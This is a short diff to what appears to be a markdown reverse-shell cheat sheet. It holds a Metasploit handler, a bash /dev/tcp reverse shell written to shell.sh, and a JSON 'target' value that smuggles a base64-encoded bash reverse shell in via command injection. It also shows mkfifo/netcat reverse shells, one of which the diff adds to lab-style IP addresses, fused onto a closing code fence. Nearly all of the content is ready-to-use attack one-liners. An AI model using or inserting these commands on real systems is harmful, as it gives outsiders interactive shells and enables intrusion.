@@ -162,8 +162,6 @@ msf5 exploit(multi/handler) > run
 [*] Started reverse TCP handler on <YOUR_IP>:<YOUR_PORT>
 ```
 
-	
-
 ---
 
 ## Bash
@@ -182,7 +180,7 @@ echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.49/666 0>&1' > shell.sh
 {"target":"\";echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjUwLjcyLzQ0NDQgMD4mMQ== | base64 -d | bash; \""}
 
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP_HOST PORT >/tmp/f
-```
+```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.122 666 >/tmp/f
 
 ---
 
